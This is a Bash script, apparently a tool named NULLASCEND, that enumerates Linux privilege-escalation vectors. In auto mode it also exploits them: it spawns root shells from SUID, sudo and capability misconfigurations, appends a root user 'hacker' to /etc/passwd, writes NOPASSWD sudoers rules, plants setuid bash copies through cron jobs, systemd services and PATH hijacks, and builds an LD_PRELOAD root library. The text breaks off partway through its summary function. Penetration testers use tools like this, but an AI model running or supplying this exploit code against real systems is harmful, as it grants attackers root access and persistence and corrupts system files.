#!/usr/bin/env bash


################################################################################
# NULLASCEND - Linux Privilege Escalation Enumeration Script
# 
# Purpose: Rapid, low-noise enumeration of core privilege escalation vectors
# WARNING: For authorized security assessments only. Unauthorized use is illegal.
# Usage: ./enum.sh [-o output.txt] [-q] [-v] [--auto]
################################################################################

set -o pipefail

readonly RED='\033[0;31m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly GREEN='\033[0;32m'
readonly CYAN='\033[0;36m'
readonly NC='\033[0m'

QUIET_MODE=false
VERBOSE_MODE=false
OUTPUT_FILE=""
AUTO_EXPLOIT=false

declare -i COUNT_CRITICAL=0
declare -i COUNT_HIGH=0
declare -i COUNT_MEDIUM=0
declare -i COUNT_LOW=0
declare -i COUNT_INFO=0

declare -a EXPLOIT_QUEUE=()


print_header() {
    $QUIET_MODE && return
    echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}[*]${NC} $1"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
}

print_finding() {
    local severity=$1
    local message=$2
    local color=$NC
    
    case $severity in
        CRITICAL) color=$RED; ((COUNT_CRITICAL++)) ;;
        HIGH)     color=$RED; ((COUNT_HIGH++)) ;;
        MEDIUM)   color=$YELLOW; ((COUNT_MEDIUM++)) ;;
        LOW)      color=$GREEN; ((COUNT_LOW++)) ;;
        INFO)     color=$CYAN; ((COUNT_INFO++)) ;;
    esac
    
    echo -e "${color}[$severity]${NC} $message"
}

print_gtfo() {
    local binary=$1
    echo -e "  ${CYAN}→ GTFOBins: https://gtfobins.github.io/gtfobins/$binary/${NC}"
}

print_hint() {
    local hint=$1
    echo -e "  ${CYAN}→ $hint${NC}"
}

print_exploit() {
    local message=$1
    echo -e "${GREEN}[EXPLOIT]${NC} $message"
}

check_cmd() {
    command -v "$1" >/dev/null 2>&1
}

queue_exploit() {
    local exploit_type=$1
    local exploit_data=$2
    EXPLOIT_QUEUE+=("$exploit_type|$exploit_data")
}

grep_credentials() {
    local file=$1
    local pattern='(password|passwd|secret|api.?key|token|credential|auth)[[:space:]]*[=:]|--password|--passwd|-p[[:space:]]|export[[:space:]].*TOKEN|\"(password|token|secret|key)\"[[:space:]]*:'
    
    if [[ ! -r "$file" ]]; then
        return 1
    fi
    
    local matches=$(grep -cE "$pattern" "$file" 2>/dev/null)
    
    if [[ $matches -gt 0 ]]; then
        echo "  Matches: $matches"
        echo "  Preview:"
        grep -E "$pattern" "$file" 2>/dev/null | head -2 | sed 's/^/    /'
        return 0
    fi
    
    return 1
}


enum_system() {
    print_header "System Context"
    
    echo "Hostname: $(hostname 2>/dev/null)"
    echo "Kernel: $(uname -r)"
    echo "OS: $(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2)"
    echo "User: $(whoami) (UID:$(id -u) GID:$(id -g))"
    echo "Groups: $(groups)"
    echo ""
    
    local kernel_ver=$(uname -r | cut -d'-' -f1)
    local major=$(echo "$kernel_ver" | cut -d'.' -f1)
    local minor=$(echo "$kernel_ver" | cut -d'.' -f2)
    
    if [[ $major -lt 4 ]] || [[ $major -eq 4 && $minor -lt 10 ]]; then
        print_finding "MEDIUM" "Kernel $kernel_ver is outdated"
        echo "  Check exploit-db: searchsploit linux kernel $kernel_ver"
    fi
}


enum_suid() {
    print_header "SUID/SGID Binaries"
    
    local gtfo_binaries=(
        "bash" "sh" "dash" "ash" "zsh"
        "find" "vim" "vi" "nano" "less" "more" "man" "view" "rvim"
        "python" "python2" "python3" "perl" "ruby" "lua" "php" "node"
        "awk" "sed" "env" "gdb" "strace"
        "systemctl" "journalctl" "dmesg"
        "nmap" "tar" "zip" "unzip" "gzip" "bzip2"
        "git" "wget" "curl" "aria2c" "ftp" "lftp"
        "docker" "screen" "tmux"
        "cp" "mv" "rsync" "scp" "dd"
        "base64" "base32" "xxd" "od" "hexdump"
        "taskset" "nice" "ionice" "run-parts"
        "make" "gcc" "cc" "ld"
    )
    
    local boring_suid=(
        "passwd" "chsh" "chfn" "newgrp" "gpasswd"
        "su" "sudo" "pkexec" "polkit-agent-helper-1"
        "mount" "umount" "fusermount" "fusermount3"
        "unix_chkpwd" "unix2_chkpwd"
        "ksu" "staprun"
        "chage" "expiry"
        "kismet_capture" "dumpcap"
        "Xorg.wrap"
    )
    
    local search_paths=(
        "/bin" "/usr/bin" "/sbin" "/usr/sbin" 
        "/usr/local/bin" "/usr/local/sbin" "/opt/bin"
    )
    
    local interesting_found=0
    local boring_count=0
    
    for path in "${search_paths[@]}"; do
        [[ ! -d "$path" ]] && continue
        
        while IFS= read -r file; do
            local base=$(basename "$file")
            local is_gtfo=false
            local is_boring=false
            
            for target in "${gtfo_binaries[@]}"; do
                if [[ "$base" == "$target" ]] || [[ "$base" == "${target}"[0-9]* ]]; then
                    is_gtfo=true
                    print_finding "HIGH" "SUID: $file"
                    print_gtfo "$target"
                    ((interesting_found++))
                    
                    if $AUTO_EXPLOIT; then
                        queue_exploit "suid" "$file|$base"
                    fi
                    break
                fi
            done
            
            $is_gtfo && continue
            
            for boring in "${boring_suid[@]}"; do
                if [[ "$base" == "$boring" ]]; then
                    is_boring=true
                    ((boring_count++))
                    break
                fi
            done
            
            if ! $is_boring && $VERBOSE_MODE; then
                print_finding "LOW" "SUID: $file"
                ((interesting_found++))
            fi
        done < <(find "$path" -maxdepth 1 -type f -perm -4000 2>/dev/null)
        
        while IFS= read -r file; do
            local base=$(basename "$file")
            for target in "${gtfo_binaries[@]}"; do
                if [[ "$base" == "$target" ]] || [[ "$base" == "${target}"[0-9]* ]]; then
                    print_finding "MEDIUM" "SGID: $file"
                    print_gtfo "$target"
                    ((interesting_found++))
                    break
                fi
            done
        done < <(find "$path" -maxdepth 1 -type f -perm -2000 2>/dev/null)
    done
    
    if [[ $interesting_found -eq 0 ]]; then
        echo "No interesting SUID/SGID binaries found"
    fi
    
    if ! $QUIET_MODE && [[ $boring_count -gt 0 ]]; then
        echo ""
        echo "Standard SUID binaries: $boring_count (hidden, use -v to show)"
    fi
}


enum_sudo() {
    print_header "Sudo Configuration"
    
    if ! check_cmd sudo; then
        echo "sudo not available"
        return
    fi
    
    local sudo_out
    sudo_out=$(sudo -n -l 2>&1 || true)

    
    if echo "$sudo_out" | grep -qi "may not run sudo"; then
        echo "User has no sudo access"
        return  
    fi
    
    if echo "$sudo_out" | grep -qi "password is required"; then
        echo "Sudo access requires password (skipping interactive check)"
        return
    fi
    
    echo "$sudo_out"
    echo ""
    
    if echo "$sudo_out" | grep -qE '\(ALL.*ALL\).*ALL|NOPASSWD.*ALL'; then
        print_finding "CRITICAL" "Unrestricted sudo access (ALL) detected"
        
        if $AUTO_EXPLOIT; then
            queue_exploit "sudo_all" "ALL"
        fi
    fi
    
    if echo "$sudo_out" | grep -q "NOPASSWD"; then
        print_finding "HIGH" "NOPASSWD sudo rules present"
        echo "$sudo_out" | grep "NOPASSWD" | sed 's/^/  /'
    fi
    
    local gtfo_sudo=("vim" "vi" "nano" "less" "more" "man" "view" "awk" "find" "perl" "python" "python2" "python3" "ruby" "lua" "php" "env" "git" "ftp" "nmap" "tar" "zip" "gzip" "systemctl" "journalctl" "docker" "node" "make")
    
    for cmd in "${gtfo_sudo[@]}"; do
        if echo "$sudo_out" | grep -qE "\\b$cmd\\b"; then
            print_finding "HIGH" "Can sudo $cmd"
            print_gtfo "$cmd"
            
            if $AUTO_EXPLOIT && echo "$sudo_out" | grep -q "NOPASSWD"; then
                queue_exploit "sudo_cmd" "$cmd"
            fi
        fi
    done
    
    if check_cmd sudo; then
        local ver=$(sudo -V 2>/dev/null | head -1 | grep -oP '\d+\.\d+\.\d+')
        if [[ -n "$ver" ]]; then
            echo "Sudo version: $ver"
            
            local major=$(echo "$ver" | cut -d. -f1)
            local minor=$(echo "$ver" | cut -d. -f2)
            local patch=$(echo "$ver" | cut -d. -f3)
            
            local is_vulnerable=false
            
            if [[ $major -eq 1 && $minor -eq 8 ]]; then
                if [[ $patch -ge 2 && $patch -le 31 ]]; then
                    is_vulnerable=true
                fi
            elif [[ $major -eq 1 && $minor -eq 9 ]]; then
                if [[ $patch -ge 0 && $patch -le 5 ]]; then
                    is_vulnerable=true
                fi
            fi
            
            if $is_vulnerable; then
                print_finding "HIGH" "Sudo version vulnerable to CVE-2021-3156 (Baron Samedit)"
                
                if $AUTO_EXPLOIT; then
                    queue_exploit "sudo_cve" "CVE-2021-3156"
                fi
            fi
        fi
    fi
}


enum_cron() {
    print_header "Cron Jobs"
    
    local found=0
    
    if crontab -l 2>/dev/null | grep -vE '^(#|$)' >/dev/null; then
        echo "User crontab:"
        crontab -l 2>/dev/null | grep -vE '^(#|$)' | sed 's/^/  /'
        echo ""
        ((found++))
    fi
    
    if [[ -r /etc/crontab ]]; then
        echo "/etc/crontab:"
        grep -vE '^(#|$)' /etc/crontab 2>/dev/null | sed 's/^/  /'
        echo ""
        
        if [[ -w /etc/crontab ]]; then
            print_finding "CRITICAL" "/etc/crontab is writable"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_cron" "/etc/crontab"
            fi
        fi
        ((found++))
    fi
    
    local cron_dirs=("/etc/cron.d" "/etc/cron.daily" "/etc/cron.hourly" "/etc/cron.weekly" "/etc/cron.monthly")
    
    for dir in "${cron_dirs[@]}"; do
        [[ ! -d "$dir" ]] && continue
        
        if [[ -w "$dir" ]]; then
            print_finding "HIGH" "Writable cron directory: $dir"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_cron_dir" "$dir"
            fi
            ((found++))
        fi
        
        for file in "$dir"/*; do
            [[ ! -f "$file" ]] && continue
            
            if [[ -w "$file" ]]; then
                print_finding "HIGH" "Writable cron file: $file"
                
                if $AUTO_EXPLOIT; then
                    queue_exploit "writable_cron_file" "$file"
                fi
                ((found++))
            fi
        done
    done
    
    if check_cmd systemctl; then
        local timer_count=$(systemctl list-timers --no-pager 2>/dev/null | grep -c '\.timer')
        if [[ $timer_count -gt 0 ]]; then
            echo "Active systemd timers: $timer_count"
            echo "  Check: systemctl list-timers --all"
            ((found++))
        fi
    fi
    
    [[ $found -eq 0 ]] && echo "No cron jobs or timers found"
}


enum_capabilities() {
    print_header "Linux Capabilities"
    
    if ! check_cmd getcap; then
        echo "getcap not available"
        return
    fi
    
    local dangerous_caps=(
        "cap_setuid" "cap_setgid" 
        "cap_dac_override" "cap_dac_read_search"
        "cap_sys_admin" "cap_sys_ptrace"
    )
    
    local gtfo_caps=(
        "python" "python2" "python3" "perl" "ruby" "php" "node"
        "vim" "vi" "nano" "less" "more" "view"
        "tar" "zip" "gzip" "bzip2"
        "gdb" "strace"
    )
    
    local manual_exploit=(
        "newuidmap" "newgidmap"
        "runc" "containerd"
    )
    
    local search_paths=("/bin" "/usr/bin" "/sbin" "/usr/sbin" "/usr/local/bin")
    local found=0
    
    for path in "${search_paths[@]}"; do
        [[ ! -d "$path" ]] && continue
        
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            
            local file=$(echo "$line" | awk '{print $1}')
            local caps=$(echo "$line" | cut -d'=' -f2-)
            local base=$(basename "$file")
            local severity="INFO"
            local has_gtfo=false
            local is_manual=false
            
            for dcap in "${dangerous_caps[@]}"; do
                if echo "$caps" | grep -q "$dcap"; then
                    severity="HIGH"
                    break
                fi
            done
            
            for target in "${gtfo_caps[@]}"; do
                if [[ "$base" == "$target"* ]]; then
                    has_gtfo=true
                    break
                fi
            done
            
            for target in "${manual_exploit[@]}"; do
                if [[ "$base" == "$target"* ]]; then
                    is_manual=true
                    break
                fi
            done
            
            if [[ "$severity" == "HIGH" ]] || ! $QUIET_MODE; then
                print_finding "$severity" "$line"
                
                if [[ "$severity" == "HIGH" ]]; then
                    if echo "$caps" | grep -q "cap_setuid"; then
                        echo "  → Can change UID to root"
                        
                        if $AUTO_EXPLOIT && $has_gtfo; then
                            queue_exploit "capability" "$file|$base|cap_setuid"
                        fi
                    fi
                    if echo "$caps" | grep -q "cap_setgid"; then
                        echo "  → Can change GID for privilege escalation"
                    fi
                    if echo "$caps" | grep -q "cap_dac_override"; then
                        echo "  → Can bypass file read/write permissions"
                    fi
                    if echo "$caps" | grep -q "cap_dac_read_search"; then
                        echo "  → Can read any file on the system"
                    fi
                    
                    if $has_gtfo; then
                        print_gtfo "$base"
                    elif $is_manual; then
                        print_hint "Manual exploitation / namespace abuse required"
                    fi
                fi
                
                ((found++))
            fi
        done < <(getcap -r "$path" 2>/dev/null)
    done
    
    [[ $found -eq 0 ]] && echo "No dangerous capabilities found"
}


enum_writable() {
    print_header "Writable Sensitive Files"
    
    local targets=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/sudoers"
        "/etc/group"
    )
    
    local found=0
    
    for file in "${targets[@]}"; do
        [[ ! -e "$file" ]] && continue
        
        if [[ -w "$file" ]]; then
            print_finding "CRITICAL" "Writable: $file"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_file" "$file"
            fi
            ((found++))
        elif [[ -r "$file" && "$file" == *"shadow"* ]]; then
            print_finding "MEDIUM" "Readable: $file (extract hashes for cracking)"
            ((found++))
        fi
    done
    
    if [[ -d /etc/sudoers.d ]]; then
        if [[ -w /etc/sudoers.d ]]; then
            print_finding "CRITICAL" "Writable directory: /etc/sudoers.d/"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_sudoers_d" "/etc/sudoers.d"
            fi
            ((found++))
        else
            for f in /etc/sudoers.d/*; do
                if [[ -f "$f" && -w "$f" ]]; then
                    print_finding "CRITICAL" "Writable: $f"
                    
                    if $AUTO_EXPLOIT; then
                        queue_exploit "writable_file" "$f"
                    fi
                    ((found++))
                fi
            done
        fi
    fi
    
    if [[ -d /etc/systemd/system ]]; then
        while IFS= read -r svc; do
            print_finding "HIGH" "Writable service: $svc"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_service" "$svc"
            fi
            ((found++))
        done < <(find /etc/systemd/system -maxdepth 2 -name "*.service" -writable 2>/dev/null)
    fi
    
    [[ $found -eq 0 ]] && echo "No writable sensitive files found"
}


enum_path() {
    print_header "PATH Configuration"
    
    echo "PATH: $PATH"
    echo ""
    
    IFS=':' read -ra dirs <<< "$PATH"
    local found=0
    
    for dir in "${dirs[@]}"; do
        if [[ -d "$dir" && -w "$dir" ]]; then
            print_finding "HIGH" "Writable PATH directory: $dir"
            echo "  → Place malicious binary to hijack commands"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_path" "$dir"
            fi
            ((found++))
        fi
    done
    
    if echo "$PATH" | grep -qE '(^|:)\.($|:)'; then
        print_finding "MEDIUM" "Current directory (.) in PATH"
        ((found++))
    fi
    
    if [[ -n "$LD_PRELOAD" ]]; then
        print_finding "HIGH" "LD_PRELOAD is set: $LD_PRELOAD"
        ((found++))
    fi
    
    if [[ -e /etc/ld.so.preload ]]; then
        if [[ -w /etc/ld.so.preload ]]; then
            print_finding "CRITICAL" "/etc/ld.so.preload is writable"
            
            if $AUTO_EXPLOIT; then
                queue_exploit "writable_ldpreload" "/etc/ld.so.preload"
            fi
            ((found++))
        elif [[ -r /etc/ld.so.preload ]]; then
            local content=$(cat /etc/ld.so.preload 2>/dev/null)
            if [[ -n "$content" ]]; then
                print_finding "INFO" "/etc/ld.so.preload exists and contains:"
                echo "$content" | sed 's/^/  /'
                ((found++))
            fi
        fi
    fi
    
    [[ $found -eq 0 ]] && echo "PATH configuration looks normal"
}


enum_credentials() {
    print_header "Credential Artifacts"
    
    local home="$HOME"
    local found=0
    
    if [[ -d "$home/.ssh" ]]; then
        if [[ -f "$home/.ssh/id_rsa" ]]; then
            print_finding "MEDIUM" "Private SSH key: $home/.ssh/id_rsa"
            print_hint "Check key reuse across users / hosts"
            ((found++))
        fi
        
        if [[ -f "$home/.ssh/id_ed25519" ]]; then
            print_finding "MEDIUM" "Private SSH key: $home/.ssh/id_ed25519"
            print_hint "Check key reuse across users / hosts"
            ((found++))
        fi
        
        if [[ -f "$home/.ssh/id_dsa" ]]; then
            print_finding "MEDIUM" "Private SSH key: $home/.ssh/id_dsa"
            print_hint "Check key reuse across users / hosts"
            ((found++))
        fi
        
        if [[ -w "$home/.ssh/authorized_keys" ]]; then
            print_finding "MEDIUM" "Writable: $home/.ssh/authorized_keys"
            print_hint "Add SSH key for persistent access"
            ((found++))
        fi
    fi
    
    if ! $QUIET_MODE; then
        echo ""
    fi
    
    for hist in ".bash_history" ".zsh_history" ".mysql_history" ".psql_history"; do
        local fullpath="$home/$hist"
        if [[ -f "$fullpath" ]]; then
            if grep_credentials "$fullpath"; then
                print_finding "MEDIUM" "Credentials in $hist"
                ((found++))
            fi
        fi
    done
    
    if ! $QUIET_MODE; then
        echo ""
    fi
    
    if [[ -f "$home/.netrc" ]]; then
        print_finding "MEDIUM" "Credential file: $home/.netrc"
        print_hint "FTP/HTTP authentication credentials"
        grep_credentials "$home/.netrc" >/dev/null 2>&1
        ((found++))
    fi
    
    if [[ -f "$home/.git-credentials" ]]; then
        print_finding "MEDIUM" "Credential file: $home/.git-credentials"
        print_hint "Git repository authentication tokens"
        grep_credentials "$home/.git-credentials" >/dev/null 2>&1
        ((found++))
    fi
    
    if [[ -f "$home/.docker/config.json" ]]; then
        print_finding "MEDIUM" "Docker config: $home/.docker/config.json"
        print_hint "May contain registry auth tokens"
        grep_credentials "$home/.docker/config.json" >/dev/null 2>&1
        ((found++))
    fi
    
    if [[ -f "$home/.aws/credentials" ]]; then
        print_finding "MEDIUM" "AWS credentials: $home/.aws/credentials"
        print_hint "Check for cloud lateral movement opportunities"
        grep_credentials "$home/.aws/credentials" >/dev/null 2>&1
        ((found++))
    fi
    
    if [[ -f "$home/.kube/config" ]]; then
        print_finding "MEDIUM" "Kubernetes config: $home/.kube/config"
        print_hint "Check for cluster access and lateral movement"
        grep_credentials "$home/.kube/config" >/dev/null 2>&1
        ((found++))
    fi
    
    [[ $found -eq 0 ]] && echo "No obvious credential artifacts found"
}


exploit_suid() {
    local file=$1
    local base=$2
    
    print_exploit "Attempting SUID exploitation: $base"
    
    case $base in
        bash|sh|dash|ash|zsh)
            print_exploit "Spawning root shell via $file -p"
            "$file" -p
            ;;
        find)
            print_exploit "Spawning root shell via find"
            "$file" . -exec /bin/sh -p \; -quit
            ;;
        vim|vi)
            print_exploit "GTFOBins exploit for $base"
            echo "Run: $file -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
            ;;
        python*|perl|ruby|php|node|lua)
            print_exploit "Spawning root shell via $base"
            if [[ "$base" == python* ]]; then
                "$file" -c 'import os; os.setuid(0); os.system("/bin/sh -p")'
            elif [[ "$base" == "perl" ]]; then
                "$file" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
            elif [[ "$base" == "ruby" ]]; then
                "$file" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
            elif [[ "$base" == "php" ]]; then
                "$file" -r 'posix_setuid(0); system("/bin/sh");'
            elif [[ "$base" == "node" ]]; then
                "$file" -e 'require("child_process").spawn("/bin/sh", ["-p"], {uid:0, stdio: "inherit"})'
            fi
            ;;
        env)
            print_exploit "Spawning root shell via env"
            "$file" /bin/sh -p
            ;;
        less|more|man)
            print_exploit "GTFOBins exploit for $base - Run: $file /etc/profile then !/bin/sh -p"
            ;;
        awk)
            print_exploit "Spawning root shell via awk"
            "$file" 'BEGIN {system("/bin/sh -p")}'
            ;;
        tar)
            print_exploit "Spawning root shell via tar"
            "$file" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
            ;;
        *)
            print_exploit "Generic SUID binary found - manual exploitation required"
            echo "  Binary: $file"
            echo "  Check GTFOBins: https://gtfobins.github.io/"
            ;;
    esac
}


exploit_sudo_all() {
    print_exploit "Attempting sudo privilege escalation"
    print_exploit "Spawning root shell via: sudo /bin/bash"
    sudo /bin/bash
}


exploit_sudo_cmd() {
    local cmd=$1
    
    print_exploit "Attempting sudo command exploitation: $cmd"
    
    case $cmd in
        vim|vi)
            print_exploit "Run: sudo $cmd -c ':!/bin/sh'"
            ;;
        less|more|man)
            print_exploit "Run: sudo $cmd /etc/profile then !/bin/sh"
            ;;
        find)
            print_exploit "Spawning root shell"
            sudo find . -exec /bin/sh \; -quit
            ;;
        python*|perl|ruby|php|node|lua)
            print_exploit "Spawning root shell"
            if [[ "$cmd" == python* ]]; then
                sudo "$cmd" -c 'import os; os.system("/bin/sh")'
            elif [[ "$cmd" == "perl" ]]; then
                sudo "$cmd" -e 'exec "/bin/sh";'
            fi
            ;;
        env)
            print_exploit "Spawning root shell"
            sudo env /bin/sh
            ;;
        awk)
            print_exploit "Spawning root shell"
            sudo awk 'BEGIN {system("/bin/sh")}'
            ;;
        *)
            print_exploit "Manual exploitation required for: sudo $cmd"
            echo "  Check: https://gtfobins.github.io/gtfobins/$cmd/"
            ;;
    esac
}


exploit_writable_file() {
    local file=$1
    
    print_exploit "Writable sensitive file: $file"
    
    case $file in
        /etc/passwd)
            print_exploit "Adding root user 'hacker' with password 'hacked'"
            echo 'hacker:$1$hacker$TF4gGJJVGhKKr4pV.8fAb/:0:0:root:/root:/bin/bash' >> "$file"
            print_exploit "Login with: su hacker (password: hacked)"
            ;;
        /etc/shadow)
            print_exploit "Shadow file writable - can modify root password hash"
            echo "  Generate hash: openssl passwd -1 newpassword"
            ;;
        /etc/sudoers)
            print_exploit "Adding ALL privileges to current user"
            echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> "$file"
            print_exploit "Run: sudo /bin/bash"
            ;;
        *)
            print_exploit "Writable file: $file - manual exploitation required"
            ;;
    esac
}


exploit_writable_sudoers_d() {
    local dir=$1
    
    print_exploit "Creating sudoers rule in: $dir"
    local rule_file="$dir/99-exploit"
    echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > "$rule_file"
    chmod 0440 "$rule_file"
    print_exploit "Rule created: $rule_file"
    print_exploit "Run: sudo /bin/bash"
}


exploit_writable_cron() {
    local file=$1
    
    print_exploit "Injecting reverse shell into cron: $file"
    echo "* * * * * root cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" >> "$file"
    print_exploit "Wait 1 minute then run: /tmp/rootshell -p"
}


exploit_writable_cron_dir() {
    local dir=$1
    
    print_exploit "Creating cron job in: $dir"
    local cron_file="$dir/exploit"
    echo '#!/bin/bash' > "$cron_file"
    echo 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell' >> "$cron_file"
    chmod +x "$cron_file"
    print_exploit "Cron job created: $cron_file"
    print_exploit "Wait for execution then run: /tmp/rootshell -p"
}


exploit_writable_cron_file() {
    exploit_writable_cron "$1"
}


exploit_writable_service() {
    local service=$1
    
    print_exploit "Injecting code into systemd service: $service"
    
    if grep -q "^\[Service\]" "$service"; then
        sed -i '/^\[Service\]/a ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell"' "$service"
        print_exploit "Service modified. Restart service or reboot."
        print_exploit "Then run: /tmp/rootshell -p"
    else
        print_exploit "Service format unknown - manual exploitation required"
    fi
}


exploit_writable_path() {
    local dir=$1
    
    print_exploit "Creating malicious binary in PATH: $dir"
    
    local target_bins=("ls" "ps" "id" "whoami")
    local chosen=""
    
    for bin in "${target_bins[@]}"; do
        if ! [[ -f "$dir/$bin" ]]; then
            chosen="$bin"
            break
        fi
    done
    
    if [[ -z "$chosen" ]]; then
        print_exploit "Common binaries already exist - trying 'update'"
        chosen="update"
    fi
    
    cat > "$dir/$chosen" << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chmod +s /tmp/rootshell
EOF
    
    chmod +x "$dir/$chosen"
    print_exploit "Created: $dir/$chosen"
    print_exploit "Wait for root to run '$chosen' then: /tmp/rootshell -p"
}


exploit_writable_ldpreload() {
    local file=$1
    
    print_exploit "Creating malicious shared library for LD_PRELOAD"
    
    local lib_path="/tmp/exploit.so"
    
    cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
    
    if check_cmd gcc; then
        gcc -fPIC -shared -nostartfiles -o "$lib_path" /tmp/exploit.c 2>/dev/null
        echo "$lib_path" > "$file"
        print_exploit "Library created and registered in $file"
        print_exploit "Wait for privileged process to load library"
    else
        print_exploit "gcc not available - cannot compile exploit library"
    fi
}


exploit_capability() {
    local file=$1
    local base=$2
    local cap=$3
    
    print_exploit "Exploiting capability: $cap on $base"
    
    if [[ "$cap" == "cap_setuid" ]]; then
        case $base in
            python*)
                print_exploit "Spawning root shell"
                "$file" -c 'import os; os.setuid(0); os.system("/bin/sh")'
                ;;
            perl)
                print_exploit "Spawning root shell"
                "$file" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
                ;;
            ruby)
                print_exploit "Spawning root shell"
                "$file" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
                ;;
            php)
                print_exploit "Spawning root shell"
                "$file" -r 'posix_setuid(0); system("/bin/sh");'
                ;;
            node)
                print_exploit "Spawning root shell"
                "$file" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
                ;;
            *)
                print_exploit "Manual exploitation required"
                print_gtfo "$base"
                ;;
        esac
    fi
}


exploit_sudo_cve() {
    local cve=$1
    
    print_exploit "Exploiting $cve (Baron Samedit)"
    print_exploit "This requires external exploit code"
    echo "  Download: https://github.com/blasty/CVE-2021-3156"
    echo "  Or search: searchsploit sudo CVE-2021-3156"
}


run_auto_exploit() {
    if [[ ${#EXPLOIT_QUEUE[@]} -eq 0 ]]; then
        echo ""
        print_finding "INFO" "No auto-exploitable vectors found"
        return
    fi
    
    print_header "Auto-Exploitation"
    
    echo "Found ${#EXPLOIT_QUEUE[@]} exploitable vector(s)"
    echo ""
    echo -e "${YELLOW}WARNING: Auto-exploitation will attempt to gain root access${NC}"
    echo -e "${YELLOW}         This may modify system files or create artifacts${NC}"
    echo ""
    read -p "Continue with auto-exploitation? [y/N]: " -n 1 -r
    echo ""
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_finding "INFO" "Auto-exploitation cancelled by user"
        return
    fi
    
    echo ""
    
    for item in "${EXPLOIT_QUEUE[@]}"; do
        local type=$(echo "$item" | cut -d'|' -f1)
        local data=$(echo "$item" | cut -d'|' -f2-)
        
        echo ""
        echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
        
        case $type in
            suid)
                local file=$(echo "$data" | cut -d'|' -f1)
                local base=$(echo "$data" | cut -d'|' -f2)
                exploit_suid "$file" "$base"
                ;;
            sudo_all)
                exploit_sudo_all
                ;;
            sudo_cmd)
                exploit_sudo_cmd "$data"
                ;;
            writable_file)
                exploit_writable_file "$data"
                ;;
            writable_sudoers_d)
                exploit_writable_sudoers_d "$data"
                ;;
            writable_cron)
                exploit_writable_cron "$data"
                ;;
            writable_cron_dir)
                exploit_writable_cron_dir "$data"
                ;;
            writable_cron_file)
                exploit_writable_cron_file "$data"
                ;;
            writable_service)
                exploit_writable_service "$data"
                ;;
            writable_path)
                exploit_writable_path "$data"
                ;;
            writable_ldpreload)
                exploit_writable_ldpreload "$data"
                ;;
            capability)
                local file=$(echo "$data" | cut -d'|' -f1)
                local base=$(echo "$data" | cut -d'|' -f2)
                local cap=$(echo "$data" | cut -d'|' -f3)
                exploit_capability "$file" "$base" "$cap"
                ;;
            sudo_cve)
                exploit_sudo_cve "$data"
                ;;
        esac
        
        if [[ $? -eq 0 ]]; then
            print_exploit "Exploit completed"
        else
            print_exploit "Exploit may have failed - check manually"
        fi
        
        sleep 1
    done
    
    echo ""
    echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
    echo ""
    print_exploit "Auto-exploitation phase complete"
    
    if [[ $(id -u) -eq 0 ]]; then
        echo ""
        print_exploit "SUCCESS: Root access obtained!"
        echo "  UID: $(id -u)"
        echo "  User: $(whoami)"
    else
        echo ""
        print_exploit "Root access not obtained - check individual exploit results"
        echo "  Some exploits may require waiting for cron jobs or process restarts"
    fi
}


print_summary() {
    echo ""
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}[*]${NC} Summary"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    
    local total=$((COUNT_CRITICAL + COUNT_HIGH + COUNT_MEDIUM + COUNT_LOW))
    
    echo ""
    echo "Findings by Severity:"
    echo ""
    
    if [[ $COUNT_CRITICAL -gt 0 ]]; then
        echo -e "  ${RED}CRITICAL: $COUNT_CRITICAL${NC}"
    else
        echo "  CRITICAL: 0"
    fi
    
    if [[ $COUNT_HIGH -gt 0 ]]; then
        echo -e "  ${RED}HIGH:     $COUNT_HIGH${NC}"
    else
        echo "  HIGH:     0"
    fi
    
    if [[ $COUNT_MEDIUM -gt 0 ]]; then
        echo -e "  ${YELLOW}MEDIUM:   $COUNT_MEDIUM${NC}"
    else
        echo "  MEDIUM:   0"
    fi
    
    if [[ $COUNT_LOW -gt 0 ]]; then
        echo -e "  ${GREEN}LOW:      $COUNT_LOW${NC}"
    else
        echo "  LOW:      0"
    fi
    
    echo ""
    echo "Total actionable findings: $total"
    
    if $AUTO_EXPLOIT && [[ ${#EXPLOIT_QUEUE[@]} -gt 0 ]]; then
        echo ""
        echo -e "${CYAN}Auto-exploitable vectors: ${#EXPLOIT_QUEUE[@]}${NC}"
    fi
    
    echo ""
    
    if [[ $COUNT_CRITICAL -gt 0 ]]; then
        print_finding "INFO" "CRITICAL findings require immediate attention"
    elif [[ $COUNT_HIGH -gt 0 ]]; then
        print_finding "INFO" "Focus exploitation efforts on HIGH severity findings"
